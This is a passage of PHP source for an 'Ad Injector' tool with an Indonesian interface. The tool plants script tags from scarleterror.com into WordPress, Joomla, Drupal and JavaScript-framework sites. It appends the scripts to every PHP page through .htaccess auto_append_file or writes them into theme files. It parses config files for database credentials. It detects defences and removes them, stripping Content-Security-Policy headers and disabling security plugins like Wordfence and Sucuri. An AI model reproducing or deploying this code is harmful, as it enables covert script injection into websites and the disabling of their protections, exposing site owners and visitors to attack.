      $htc   = preg_replace('/\n?# AD-INJ-START.*?# AD-INJ-END\n?/s', '', $htc);
      // Also clean bare php_value line from old format
      $htc   = preg_replace('/\nphp_value auto_append_file[^\n]*/i', '', $htc);
      $block = "\n# AD-INJ-START\n"
             . "<IfModule mod_php5.c>\n  php_value auto_append_file \"$absPush\"\n</IfModule>\n"
             . "<IfModule mod_php7.c>\n  php_value auto_append_file \"$absPush\"\n</IfModule>\n"
             . "<IfModule mod_php8.c>\n  php_value auto_append_file \"$absPush\"\n</IfModule>\n"
             . "# AD-INJ-END\n";
      $htc   = rtrim($htc) . $block;

      if (file_put_contents($htFile, $htc) === false)
          return 'Gagal menulis .htaccess — pastikan folder root writable.';

      return true;
  }

  function doHtaccessRemove($root) {
      $pushFile = $root . '/ads.php';
      $htFile   = $root . '/.htaccess';
      $uiFile   = $root . '/.user.ini';

      if (file_exists($htFile)) {
          $htc = @file_get_contents($htFile);
          if ($htc !== false) {
              $htc = preg_replace('/\n?# AD-INJ-START.*?# AD-INJ-END\n?/s', '', $htc);
              $htc = preg_replace('/\nphp_value auto_append_file[^\n]*/i', '', $htc);
              file_put_contents($htFile, rtrim($htc) . "\n");
          }
      }
      if (file_exists($uiFile)) {
          $uic = @file_get_contents($uiFile);
          if ($uic !== false) {
              $uic = preg_replace('/\nauto_append_file\s*=[^\n]*/i', '', $uic);
              file_put_contents($uiFile, rtrim($uic) . "\n");
          }
      }
      if (file_exists($pushFile)) @unlink($pushFile);
      return true;
  }

  // ─── DB Helpers ──────────────────────────────────────────────────────────────
  function wpActiveThemeFromDb($root) {
      $cfg = "$root/wp-config.php";
      if (!file_exists($cfg)) return null;
      $c = file_get_contents($cfg);

      if (!preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]/",    $c, $mn))  return null;
      if (!preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]/",    $c, $mu))  return null;
      if (!preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]*)['\"]/",$c, $mp))  return null;
      if (!preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]/",    $c, $mh))  return null;
      preg_match('/\$table_prefix\s*=\s*[\'"]([^\'"]+)[\'"]/', $c, $mpfx);

      $prefix = isset($mpfx[1]) ? $mpfx[1] : 'wp_';
      $conn   = @new mysqli($mh[1], $mu[1], $mp[1], $mn[1]);
      if ($conn->connect_error) return null;

      $tbl    = $conn->real_escape_string($prefix . 'options');
      $result = $conn->query("SELECT option_value FROM `{$tbl}` WHERE option_name = 'template' LIMIT 1");
      if (!$result) { $conn->close(); return null; }

      $row = $result->fetch_assoc();
      $conn->close();
      return isset($row['option_value']) ? ($row['option_value'] ?: null) : null;
  }

  function joomlaActiveTemplateFromDb($root) {
      $cfg = "$root/configuration.php";
      if (!file_exists($cfg)) return null;
      $c = file_get_contents($cfg);

      if (!preg_match('/\$db\s*=\s*[\'"]([^\'"]+)[\'"]/',       $c, $mdb)) return null;
      if (!preg_match('/\$user\s*=\s*[\'"]([^\'"]+)[\'"]/',     $c, $mu))  return null;
      if (!preg_match('/\$password\s*=\s*[\'"]([^\'"]*)[\'"]\s*;/', $c, $mp)) return null;
      if (!preg_match('/\$host\s*=\s*[\'"]([^\'"]+)[\'"]/',     $c, $mh))  return null;
      preg_match('/\$dbprefix\s*=\s*[\'"]([^\'"]+)[\'"]/', $c, $mpfx);

      $prefix = isset($mpfx[1]) ? $mpfx[1] : 'jos_';
      $conn   = @new mysqli($mh[1], $mu[1], $mp[1], $mdb[1]);
      if ($conn->connect_error) return null;

      $tbl    = $conn->real_escape_string($prefix . 'extensions');
      $result = $conn->query(
          "SELECT element FROM `{$tbl}`
          WHERE type = 'template' AND enabled = 1 AND client_id = 0
          ORDER BY extension_id DESC LIMIT 1"
      );
      if (!$result) { $conn->close(); return null; }

      $row = $result->fetch_assoc();
      $conn->close();
      return isset($row['element']) ? ($row['element'] ?: null) : null;
  }

  function relPath($root, $absPath) {
      $r = realpath($root)   ?: $root;
      $a = realpath($absPath) ?: $absPath;
      return '/' . ltrim(str_replace('\\', '/', str_replace($r, '', $a)), '/');
  }

  function drupalActiveThemeFromDb($root) {
      $settingsCandidates = array_merge(
          ["$root/sites/default/settings.php"],
          glob("$root/sites/*/settings.php") ?: []
      );
      foreach ($settingsCandidates as $cfg) {
          if (!file_exists($cfg)) continue;
          $c = file_get_contents($cfg);

          // Extract DB creds from $databases['default']['default'] array
          if (!preg_match("/['\"]database['\"]\s*=>\s*['\"]([^'\"]+)['\"]/", $c, $mdb)) continue;
          if (!preg_match("/['\"]username['\"]\s*=>\s*['\"]([^'\"]+)['\"]/", $c, $mu))  continue;
          if (!preg_match("/['\"]password['\"]\s*=>\s*['\"]([^'\"]*)['\"]/", $c, $mp))  continue;
          if (!preg_match("/['\"]host['\"]\s*=>\s*['\"]([^'\"]+)['\"]/",     $c, $mh))  continue;
          preg_match("/['\"]prefix['\"]\s*=>\s*['\"]([^'\"]*)['\"]/",$c, $mpfx);

          $prefix = isset($mpfx[1]) ? $mpfx[1] : '';
          $conn   = @new mysqli($mh[1], $mu[1], $mp[1], $mdb[1]);
          if ($conn->connect_error) continue;

          // Drupal 8/9/10 — config table (YAML data)
          $tbl    = $conn->real_escape_string($prefix . 'config');
          $result = $conn->query("SELECT data FROM `{$tbl}` WHERE name = 'system.theme' LIMIT 1");
          if ($result && $row = $result->fetch_assoc()) {
              if (preg_match('/default:\s*[\'"]?([a-zA-Z0-9_]+)[\'"]?/', $row['data'], $tm)) {
                  $conn->close();
                  return $tm[1];
              }
          }

          // Drupal 7 — variable table (PHP serialized)
          $tbl    = $conn->real_escape_string($prefix . 'variable');
          $result = $conn->query("SELECT value FROM `{$tbl}` WHERE name = 'theme_default' LIMIT 1");
          if ($result && $row = $result->fetch_assoc()) {
              $theme = @unserialize($row['value']);
              if ($theme && is_string($theme)) {
                  $conn->close();
                  return $theme;
              }
          }

          $conn->close();
      }
      return null;
  }

  // ─── Verify ──────────────────────────────────────────────────────────────────
  function getSiteUrl() {
      $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
      $host   = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
      return $scheme . '://' . $host . '/';
  }

  function verifyInjection($siteUrl) {
      $html            = false;
      $httpCode        = null;
      $responseHeaders = array();

      if (function_exists('curl_init')) {
          $ch = curl_init($siteUrl);
          curl_setopt_array($ch, [
              CURLOPT_RETURNTRANSFER => true,
              CURLOPT_FOLLOWLOCATION => true,
              CURLOPT_MAXREDIRS      => 5,
              CURLOPT_TIMEOUT        => 15,
              CURLOPT_USERAGENT      => 'Mozilla/5.0 (compatible; AdVerifier/1.0)',
              CURLOPT_SSL_VERIFYPEER => false,
              CURLOPT_SSL_VERIFYHOST => false,
          ]);
          // Tangkap response headers
          curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($curl, $header) use (&$responseHeaders) {
              $len   = strlen($header);
              $parts = explode(':', $header, 2);
              if (count($parts) === 2) {
                  $responseHeaders[strtolower(trim($parts[0]))] = trim($parts[1]);
              }
              return $len;
          });
          $html     = curl_exec($ch);
          $curlErr  = curl_error($ch);
          $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
          curl_close($ch);
          if (!$html) return ['ok' => false, 'error' => 'curl error: ' . $curlErr];
      } else {
          $ctx  = stream_context_create(['http' => [
              'timeout'         => 15,
              'follow_location' => 1,
              'max_redirects'   => 5,
              'user_agent'      => 'Mozilla/5.0 (compatible; AdVerifier/1.0)',
              'ignore_errors'   => true,
          ]]);
          $html = @file_get_contents($siteUrl, false, $ctx);
          if ($html === false) return ['ok' => false, 'error' => 'Gagal fetch halaman. Coba aktifkan curl di PHP.'];
          // Tangkap headers dari file_get_contents
          if (isset($http_response_header) && is_array($http_response_header)) {
              foreach ($http_response_header as $h) {
                  $parts = explode(':', $h, 2);
                  if (count($parts) === 2) {
                      $responseHeaders[strtolower(trim($parts[0]))] = trim($parts[1]);
                  }
              }
          }
      }

      $count = substr_count(strtolower($html), 'scarleterror.com');
      preg_match_all('/<script[^>]+src=[\'"]([^\'"]*scarleterror\.com[^\'"]*)[\'"][^>]*>/i', $html, $m);
      $foundUrls = array_unique(isset($m[1]) ? $m[1] : array());

      // Deteksi PHP error di halaman
      $plainText = strip_tags($html);
      $phpError  = (bool) preg_match('/\b(Fatal error|Parse error|Catchable fatal error):/i', $plainText, $pe);
      $phpErrMsg = $phpError ? trim(substr($pe[0], 0, 200)) : '';

      // Cek Content-Security-Policy
      $cspHeader = isset($responseHeaders['content-security-policy']) ? $responseHeaders['content-security-policy'] : '';
      $cspBlocks = false;
      if ($cspHeader && preg_match('/(?:^|;)\s*script-src\s+([^;]+)/i', $cspHeader, $cm)) {
          $scriptSrc = $cm[1];
          if (strpos($scriptSrc, 'scarleterror.com') === false && strpos($scriptSrc, '*') === false) {
              $cspBlocks = true;
          }
      }

      // Cek Cloudflare / Sucuri WAF
      $isCloudflare = isset($responseHeaders['cf-ray'])
                   || (isset($responseHeaders['server']) && stripos($responseHeaders['server'], 'cloudflare') !== false);
      $isSucuriWaf  = isset($responseHeaders['x-sucuri-id']);

      return [
          'ok'         => true,
          'count'      => $count,
          'urls'       => $foundUrls,
          'siteUrl'    => $siteUrl,
          'httpCode'   => $httpCode,
          'phpError'   => $phpError,
          'phpErrMsg'  => $phpErrMsg,
          'cspHeader'  => $cspHeader,
          'cspBlocks'  => $cspBlocks,
          'cloudflare' => $isCloudflare,
          'sucuriWaf'  => $isSucuriWaf,
      ];
  }

  // ─── Blocker Detection ───────────────────────────────────────────────────────
  function detectBlockers($root, $platform) {
      $found = array();

      // Cek .htaccess untuk Content-Security-Policy
      $htFile = "$root/.htaccess";
      if (file_exists($htFile)) {
          $htc = @file_get_contents($htFile);
          if ($htc && stripos($htc, 'Content-Security-Policy') !== false) {
              preg_match('/Header\s+(?:(?:always\s+)?set\s+)?Content-Security-Policy[^\n]*/i', $htc, $hm);
              $found[] = array(
                  'type'   => 'htaccess-csp',
                  'label'  => 'Content-Security-Policy di .htaccess',
                  'detail' => isset($hm[0]) ? trim($hm[0]) : '',
                  'action' => 'remove_htaccess_csp',
                  'btnlbl' => 'Hapus CSP dari .htaccess',
              );
          }
      }

      // Cek WordPress security/firewall plugins
      if ($platform['slug'] === 'wordpress') {
          $pluginDir    = "$root/wp-content/plugins";
          $knownPlugins = array(
              'wordfence'                  => 'Wordfence Security',
              'sucuri-scanner'             => 'Sucuri Security',
              'all-in-one-wp-security'     => 'All In One WP Security & Firewall',
              'better-wp-security'         => 'iThemes Security',
              'ithemes-security'           => 'iThemes Security',
              'wp-cerber'                  => 'WP Cerber Security',
              'shield-security'            => 'Shield Security',
              'ninja-firewall'             => 'NinjaFirewall',
              'bbq-firewall'               => 'BBQ Firewall',
              'wp-simple-firewall'         => 'Simple Firewall',
              'http-headers'               => 'HTTP Headers (bisa set CSP)',
              'content-security-policy'    => 'Content Security Policy Plugin',
              'wp-content-security-policy' => 'WP Content Security Policy',
              'security-headers'           => 'Security Headers Plugin',
              'anti-malware'               => 'Anti-Malware Security & Brute-Force',
          );
          if (is_dir($pluginDir)) {
              foreach ($knownPlugins as $slug => $name) {
                  if (is_dir("$pluginDir/$slug")) {
                      $found[] = array(
                          'type'   => 'wp-plugin',
                          'label'  => $name,
                          'detail' => "wp-content/plugins/$slug",
                          'slug'   => $slug,
                          'action' => 'disable_wp_plugin',
                          'btnlbl' => 'Nonaktifkan Plugin',
                      );
                  }
              }
          }
      }

      return $found;
  }

  function removeCspFromHtaccess($root) {
      $htFile = "$root/.htaccess";
      if (!file_exists($htFile)) return true;
      $htc = @file_get_contents($htFile);
      if ($htc === false) return 'Gagal membaca .htaccess';
      $new = preg_replace('/\n?Header\s+(?:(?:always\s+)?set\s+)?Content-Security-Policy[^\n]*/i', '', $htc);
      return (file_put_contents($htFile, $new) !== false) ? true : 'Gagal menulis .htaccess';
  }

  function disableWpPlugin($root, $slug) {
      if (!preg_match('/^[a-zA-Z0-9_-]+$/', $slug)) return 'Nama plugin tidak valid.';
      $pluginBase = realpath("$root/wp-content/plugins");
      if (!$pluginBase) return 'Folder plugins tidak ditemukan.';
      $pluginDir  = realpath("$pluginBase/$slug");
      if (!$pluginDir || strpos($pluginDir, $pluginBase) !== 0) return 'Path plugin tidak valid.';
      if (!is_dir($pluginDir)) return 'Plugin tidak ditemukan di folder.';
      $disabledDir = $pluginBase . '/' . $slug . '_disabled_' . date('YmdHis');
      return rename($pluginDir, $disabledDir) ? true : 'Gagal rename folder plugin — cek permission PHP.';
  }

  // =============================================================================
  // RENDER
  // =============================================================================

  function renderPage($root, $platform, $target, $status, $existing, $flash, $verifyResult, $htActive = false, $blockers = array()) {
      $writable = $target && file_exists($target['abs']) && is_writable($target['abs']);
  ?>
  <!DOCTYPE html>
  <html lang="id">
  <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Ad Injector</title>
  <style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{min-height:100vh;background:#0f172a;font-family:"Segoe UI",Arial,sans-serif;color:#e2e8f0;padding:28px 14px}
  .wrap{max-width:660px;margin:0 auto;display:flex;flex-direction:column;gap:18px}
  .topbar{display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px}
  h1{font-size:21px;font-weight:700;color:#f1f5f9}
  .card{background:#1e293b;border:1px solid #334155;border-radius:14px;padding:22px 24px}
  .card-title{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:#475569;margin-bottom:16px}
  .info-grid{display:grid;grid-template-columns:140px 1fr;gap:10px 14px;font-size:13px;align-items:start}
  .lbl{color:#64748b;font-weight:600;padding-top:1px}
  .val{color:#e2e8f0;word-break:break-all}
  .badge{display:inline-flex;align-items:center;border-radius:999px;font-size:11px;font-weight:700;padding:3px 10px;border:1px solid;white-space:nowrap}
  .b-ok  {color:#4ade80;background:#052e16;border-color:#166534}
  .b-no  {color:#94a3b8;background:#1e293b;border-color:#334155}
  .b-warn{color:#fbbf24;background:#1c1300;border-color:#b45309}
  .b-err {color:#f87171;background:#450a0a;border-color:#7f1d1d}
  .flash-ok  {background:#052e16;border:1px solid #166534;color:#86efac;border-radius:10px;padding:13px 16px;font-size:13px;line-height:1.5}
  .flash-warn{background:#1c1300;border:1px solid #b45309;color:#fbbf24;border-radius:10px;padding:13px 16px;font-size:13px;line-height:1.5}
  .flash-err {background:#450a0a;border:1px solid #7f1d1d;color:#fca5a5;border-radius:10px;padding:13px 16px;font-size:13px;line-height:1.5}
  .blocker-row{display:flex;align-items:flex-start;justify-content:space-between;gap:10px;padding:10px 0;border-top:1px solid #334155;flex-wrap:wrap}
  .blocker-row:first-child{border-top:none;padding-top:0}
  .file-code{font-family:Consolas,"Courier New",monospace;font-size:12px;color:#7dd3fc;background:#0f172a;border:1px solid #1e3a5f;padding:7px 11px;border-radius:7px;display:block;word-break:break-all}
  .hint{font-size:12px;color:#64748b;line-height:1.55;margin-top:5px}
  label{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:#64748b;margin-bottom:8px}
  textarea{width:100%;background:#0f172a;border:1px solid #334155;border-radius:9px;padding:11px 13px;color:#e2e8f0;font-family:Consolas,"Courier New",monospace;font-size:13px;line-height:1.6;resize:vertical;outline:none;min-height:108px}
  textarea:focus{border-color:#3b82f6;box-shadow:0 0 0 3px rgba(59,130,246,.15)}
  .btn-row{display:flex;gap:9px;flex-wrap:wrap;margin-top:14px}
  .btn{border:none;border-radius:9px;padding:10px 20px;font-size:13px;font-weight:700;cursor:pointer;transition:.15s}
  .btn:disabled{opacity:.45;cursor:not-allowed}
  .btn-primary{background:#3b82f6;color:#fff}.btn-primary:hover:not(:disabled){background:#2563eb}
  .btn-danger {background:#dc2626;color:#fff}.btn-danger:hover:not(:disabled) {background:#b91c1c}
  .btn-ghost  {background:none;border:1px solid #334155;color:#94a3b8}.btn-ghost:hover:not(:disabled){border-color:#475569;color:#cbd5e1}
  .btn-verify {background:none;border:1px solid #0e7490;color:#22d3ee}.btn-verify:hover:not(:disabled){background:#164e63;color:#67e8f9}
  .verify-ok  {background:#052e16;border:1px solid #166534;color:#86efac;border-radius:9px;padding:13px 15px;font-size:13px;margin-top:14px;line-height:1.7}
  .verify-no  {background:#1c1300;border:1px solid #b45309;color:#fbbf24;border-radius:9px;padding:13px 15px;font-size:13px;margin-top:14px;line-height:1.7}
  .verify-err {background:#450a0a;border:1px solid #7f1d1d;color:#fca5a5;border-radius:9px;padding:13px 15px;font-size:13px;margin-top:14px;line-height:1.7}
  .script-url {display:block;font-family:Consolas,"Courier New",monospace;font-size:11px;margin-top:4px;word-break:break-all;opacity:.85}
  .current-block{background:#0f172a;border:1px solid #1e3a5f;border-radius:9px;padding:13px;font-family:Consolas,"Courier New",monospace;font-size:12px;color:#7dd3fc;white-space:pre-wrap;word-break:break-all;max-height:180px;overflow-y:auto;line-height:1.6;margin-bottom:4px}
  .divider{border:none;border-top:1px solid #334155;margin:18px 0}
  .no-target{color:#fbbf24;font-size:13px;line-height:1.7}
  code{background:#0f172a;border:1px solid #1e3a5f;padding:2px 6px;border-radius:4px;font-size:12px;color:#7dd3fc;font-family:Consolas,"Courier New",monospace}
  </style>
  </head>
  <body>
  <div class="wrap">

    <div class="topbar">
      <h1>💉 Ad Injector</h1>
    </div>

    <?php if ($flash): ?>
    <div class="<?= $flash['type'] === 'success' ? 'flash-ok' : ($flash['type'] === 'warning' ? 'flash-warn' : 'flash-err') ?>">
      <?= htmlspecialchars($flash['text']) ?>
    </div>
    <?php endif ?>

    <?php if (!empty($blockers)): ?>
    <!-- ── Pemblokir Terdeteksi ────────────────────────────────────────── -->
    <div class="card" style="border-color:#b45309">
      <div class="card-title" style="color:#fbbf24">⚠ Pemblokir Terdeteksi (<?= count($blockers) ?>)</div>
      <?php foreach ($blockers as $blk): ?>
      <div class="blocker-row">
        <div>
          <div style="font-size:13px;font-weight:600;color:#e2e8f0"><?= htmlspecialchars($blk['label']) ?></div>
          <?php if (!empty($blk['detail'])): ?>
          <div style="font-size:11px;color:#64748b;margin-top:3px;font-family:Consolas,'Courier New',monospace;word-break:break-all"><?= htmlspecialchars($blk['detail']) ?></div>
          <?php endif ?>
          <?php if ($blk['type'] === 'htaccess-csp'): ?>
          <div style="font-size:11px;color:#94a3b8;margin-top:4px">Header ini mencegah browser memuat script dari domain luar (termasuk ad script).</div>
          <?php elseif ($blk['type'] === 'wp-plugin'): ?>
          <div style="font-size:11px;color:#94a3b8;margin-top:4px">Plugin ini bisa memblokir/memodifikasi output halaman. Nonaktifkan jika script tidak muncul.</div>
          <?php endif ?>
        </div>
        <form method="POST" style="flex-shrink:0"
          onsubmit="return confirm('Yakin <?= $blk['action'] === 'disable_wp_plugin' ? 'nonaktifkan plugin ini? Folder akan direname.' : 'hapus CSP dari .htaccess?' ?>');">
          <input type="hidden" name="act" value="<?= htmlspecialchars($blk['action']) ?>">
          <?php if (!empty($blk['slug'])): ?>
          <input type="hidden" name="plugin_slug" value="<?= htmlspecialchars($blk['slug']) ?>">
          <?php endif ?>
          <button class="btn btn-danger" type="submit" style="font-size:12px;padding:7px 14px">
            <?= htmlspecialchars($blk['btnlbl']) ?>
          </button>
        </form>
      </div>
      <?php endforeach ?>
    </div>
    <?php endif ?>

    <!-- ── Detection Info ─────────────────────────────────────────────────── -->
    <div class="card">
      <div class="card-title">Deteksi Otomatis</div>
      <div class="info-grid">

        <span class="lbl">Platform</span>
        <span class="val">
          <?= htmlspecialchars($platform['name']) ?>
          <?php if ($platform['version']): ?>
            <span style="color:#64748b;font-size:12px;margin-left:4px"><?= htmlspecialchars($platform['version']) ?></span>
          <?php endif ?>
        </span>

        <?php if ($platform['theme']): ?>
        <span class="lbl">Active Theme</span>
        <span class="val" style="color:#a5f3fc"><?= htmlspecialchars($platform['theme']) ?></span>
        <?php endif ?>

        <span class="lbl">Inject File</span>
        <span class="val">
          <?php if ($target): ?>
            <code class="file-code"><?= htmlspecialchars($target['rel']) ?></code>
            <?php if (!$writable): ?>
              <p class="hint" style="color:#fbbf24">⚠ File tidak writable — jalankan <code>chmod 644 <?= htmlspecialchars($target['rel']) ?></code></p>
            <?php endif ?>
          <?php elseif ($htActive): ?>
            <span class="badge b-ok">✔ .htaccess auto-append</span>
          <?php else: ?>
            <span class="badge b-warn">Tidak ditemukan</span>
          <?php endif ?>
        </span>

        <span class="lbl">Metode</span>
        <span class="val" style="color:#94a3b8;font-size:12px">
          <?php if ($platform['slug'] === 'wordpress'): ?>
            <code>add_action('wp_footer', ...)</code> di functions.php
          <?php elseif ($platform['slug'] === 'nextjs'): ?>
            Inject ke <code>&lt;/body&gt;</code> di layout.tsx <em>atau</em> <code>out/index.html</code> (static)
          <?php elseif ($platform['slug'] === 'nuxt'): ?>
            Inject ke <code>&lt;/template&gt;</code> di app.vue / layouts <em>atau</em> <code>dist/index.html</code>
          <?php elseif ($platform['slug'] === 'vue'): ?>
            Inject ke <code>&lt;/body&gt;</code> di public/index.html <em>atau</em> App.vue
          <?php elseif ($platform['slug'] === 'react'): ?>
            Inject ke <code>&lt;/body&gt;</code> di public/index.html atau build/index.html
          <?php else: ?>
            Insert sebelum <code>&lt;/body&gt;</code>
          <?php endif ?>
        </span>

        <span class="lbl">Status</span>
        <span class="val">
          <?php if ($status === 'injected'): ?>
            <span class="badge b-ok">✔ Sudah Diinjeksi</span>
          <?php elseif ($status === 'no-file'): ?>
            <span class="badge b-err">File tidak ada</span>
          <?php elseif ($status === 'no-read'): ?>
            <span class="badge b-warn">Tidak bisa dibaca</span>
          <?php else: ?>
            <span class="badge b-no">Belum Diinjeksi</span>
          <?php endif ?>
        </span>

      </div>
    </div>

    <?php if ($htActive): ?>
    <!-- ── .htaccess active card (always shown when active) ────────────── -->
    <div class="card" style="border-color:#0e7490">
      <div class="card-title" style="color:#22d3ee">⚡ Auto-Append Aktif (.htaccess)</div>
      <p style="font-size:13px;color:#94a3b8;margin-bottom:14px;line-height:1.7">
        Script di-inject ke <strong>semua halaman PHP</strong> via
        <code>php_value auto_append_file</code> di <code>.htaccess</code>.<br>
        File loader: <code>ads.php</code>
      </p>
      <div class="btn-row">
        <form method="POST" style="display:inline">
          <input type="hidden" name="act" value="verify">
          <button class="btn btn-verify" type="submit">🔍 Cek Live</button>
        </form>
        <form method="POST" style="display:inline"
          onsubmit="return confirm('Hapus ads.php dan bersihkan .htaccess?')">
          <input type="hidden" name="act" value="htaccess_remove">
          <button class="btn btn-danger" type="submit">Hapus Auto-Append</button>
        </form>
      </div>
      <?php if ($verifyResult !== null): ?>
        <?php if (!$verifyResult['ok']): ?>
        <div class="verify-err">✗ Gagal fetch halaman: <?= htmlspecialchars($verifyResult['error']) ?></div>
        <?php elseif (isset($verifyResult['httpCode']) && $verifyResult['httpCode'] >= 400): ?>
        <div class="verify-err">
          ⚠ <strong>Website error setelah inject!</strong> HTTP <?= (int)$verifyResult['httpCode'] ?><br>
          <span style="font-size:12px">Kemungkinan inject merusak file. Segera hapus script dan cek file secara manual.</span>
        </div>
        <?php elseif (!empty($verifyResult['phpError'])): ?>
        <div class="verify-err">
          ⚠ <strong>PHP Error terdeteksi di halaman!</strong><br>
          <span style="font-size:12px"><?= htmlspecialchars($verifyResult['phpErrMsg']) ?><br>
          Kemungkinan inject merusak file. Hapus script sekarang.</span>
        </div>
        <?php elseif ($verifyResult['count'] > 0): ?>
        <div class="verify-ok">
          ✔ Website <strong>OK</strong> + Script <strong>terdeteksi</strong> di HTML source!<br>
          <?= $verifyResult['count'] ?> kemunculan <code>scarleterror.com</code> ditemukan.
          <?php foreach ($verifyResult['urls'] as $u): ?>
            <span class="script-url">↳ <?= htmlspecialchars($u) ?></span>
          <?php endforeach ?>
          <span class="script-url" style="opacity:.4">Dicek di: <a href="<?= htmlspecialchars($verifyResult['siteUrl']) ?>" target="_blank" rel="noopener" style="color:#64748b"><?= htmlspecialchars($verifyResult['siteUrl']) ?></a><?= $verifyResult['httpCode'] ? ' — HTTP ' . (int)$verifyResult['httpCode'] : '' ?></span>
        </div>
        <?php else: ?>
        <div class="verify-no">
          ✔ Website <strong>OK</strong> (HTTP <?= $verifyResult['httpCode'] ? (int)$verifyResult['httpCode'] : '?' ?>) — tapi script belum kedeteksi.<br>
          <span style="font-size:12px">Dicek di: <a href="<?= htmlspecialchars($verifyResult['siteUrl']) ?>" target="_blank" rel="noopener" style="color:#64748b"><?= htmlspecialchars($verifyResult['siteUrl']) ?></a><br>
          Kemungkinan: cache belum clear, server butuh restart PHP-FPM, atau halaman ini tidak pakai template yang diinjeksi.</span>
        </div>
        <?php endif ?>
        <?php if (!empty($verifyResult['cspBlocks'])): ?>
        <div class="verify-err" style="margin-top:8px">
          ⛔ <strong>CSP Header memblokir script di browser!</strong><br>
          <span style="font-size:11px">Server mengirim: <code><?= htmlspecialchars($verifyResult['cspHeader']) ?></code><br>
          Browser tidak load script dari domain yang tidak diizinkan. Hapus via kartu Pemblokir di atas.</span>
        </div>
        <?php endif ?>
        <?php if (!empty($verifyResult['cloudflare'])): ?>
        <div style="margin-top:8px;font-size:12px;color:#94a3b8;background:#0f172a;border:1px solid #334155;border-radius:7px;padding:10px 12px">
          ☁ <strong>Cloudflare terdeteksi</strong> — Rocket Loader bisa delay/modify loading script. Matikan Rocket Loader di Cloudflare dashboard.
        </div>
        <?php endif ?>
        <?php if (!empty($verifyResult['sucuriWaf'])): ?>
        <div style="margin-top:8px;font-size:12px;color:#94a3b8;background:#0f172a;border:1px solid #334155;border-radius:7px;padding:10px 12px">
          🛡 <strong>Sucuri WAF terdeteksi</strong> — WAF bisa memblokir script dari domain luar.
        </div>
        <?php endif ?>
      <?php endif ?>
    </div>

    <?php endif ?>

    <?php if (!$target && !$htActive): ?>
    <!-- ── No target found ─────────────────────────────────────────────────── -->
    <div class="card">
      <p class="no-target">
        ⚠ File target inject tidak ditemukan secara otomatis.<br>
        Gunakan salah satu opsi di bawah ini.
      </p>
      <hr class="divider">

      <!-- Option 1: .htaccess auto-append -->
      <div class="card-title" style="margin-top:0;color:#22d3ee">⚡ Opsi 1 — Auto-Append via .htaccess <span style="font-size:10px;color:#64748b;font-weight:400;text-transform:none">(direkomendasikan — inject ke SEMUA halaman PHP)</span></div>
      <p class="hint" style="margin-bottom:12px">Membuat <code>ads.php</code> dan menambahkan <code>php_value auto_append_file</code> ke <code>.htaccess</code>. Script muncul di setiap halaman PHP tanpa harus edit file satu per satu.</p>
      <form method="POST">
        <input type="hidden" name="act" value="htaccess_inject">
        <label>Script Tag &lt;script&gt;</label>
        <textarea name="scripts" rows="3"
          placeholder="<?= htmlspecialchars('<script src="https://scarleterror.com/....js"></script>') ?>"></textarea>
        <div class="btn-row">
          <button class="btn btn-primary" style="background:#0e7490" type="submit">⚡ Pasang via .htaccess</button>
        </div>
      </form>

      <hr class="divider">

      <!-- Option 2: Manual file inject -->
      <div class="card-title" style="color:#475569">Opsi 2 — Inject Manual ke File Tertentu</div>
      <form method="POST">
        <input type="hidden" name="act" value="manual_inject">
        <label>Path File (relatif dari root, contoh: <code style="text-transform:none">index.php</code>)</label>
        <input type="text" name="manualpath"
          placeholder="index.php"
          style="width:100%;background:#0f172a;border:1px solid #334155;border-radius:9px;padding:11px 13px;color:#e2e8f0;font-family:Consolas,'Courier New',monospace;font-size:13px;outline:none;margin-bottom:14px">
        <label>Script Tag &lt;script&gt;</label>
        <textarea name="scripts" rows="3"
          placeholder="<?= htmlspecialchars('<script src="https://scarleterror.com/....js"></script>') ?>"></textarea>
        <div class="btn-row">
          <button class="btn btn-primary" type="submit">💉 Inject Manual</button>
        </div>
      </form>
    </div>

    <?php elseif ($target && $status === 'injected'): ?>
    <!-- ── Already injected ────────────────────────────────────────────────── -->
    <div class="card">
      <div class="card-title">Script Aktif Saat Ini</div>

      <?php if ($existing): ?>
      <div class="current-block"><?= htmlspecialchars($existing) ?></div>
      <?php endif ?>

      <div class="btn-row">
        <button class="btn btn-ghost" type="button"
          onclick="document.getElementById('upd').style.display='block';this.style.display='none'">
          Ganti Script
        </button>
        <form method="POST" style="display:inline">
          <input type="hidden" name="act" value="verify">
          <button class="btn btn-verify" type="submit">🔍 Cek Live</button>
        </form>
        <form method="POST" style="display:inline"
          onsubmit="return confirm('Hapus script dari file? Tidak bisa dibatalkan.')">
          <input type="hidden" name="act" value="remove">
          <button class="btn btn-danger" type="submit" <?= $writable ? '' : 'disabled' ?>>
            Hapus
          </button>
        </form>
      </div>

      <?php if ($verifyResult !== null): ?>
        <?php if (!$verifyResult['ok']): ?>
        <div class="verify-err">✗ Gagal fetch halaman: <?= htmlspecialchars($verifyResult['error']) ?></div>
        <?php elseif (isset($verifyResult['httpCode']) && $verifyResult['httpCode'] >= 400): ?>
        <div class="verify-err">
          ⚠ <strong>Website error setelah inject!</strong> HTTP <?= (int)$verifyResult['httpCode'] ?><br>
          <span style="font-size:12px">Kemungkinan inject merusak file. Segera hapus script dan cek file secara manual.</span>
        </div>
        <?php elseif (!empty($verifyResult['phpError'])): ?>
        <div class="verify-err">
          ⚠ <strong>PHP Error terdeteksi di halaman!</strong><br>
          <span style="font-size:12px"><?= htmlspecialchars($verifyResult['phpErrMsg']) ?><br>
          Kemungkinan inject merusak file. Hapus script sekarang.</span>
        </div>
        <?php elseif ($verifyResult['count'] > 0): ?>
        <div class="verify-ok">
          ✔ Website <strong>OK</strong> + Script <strong>terdeteksi</strong> di HTML source!<br>
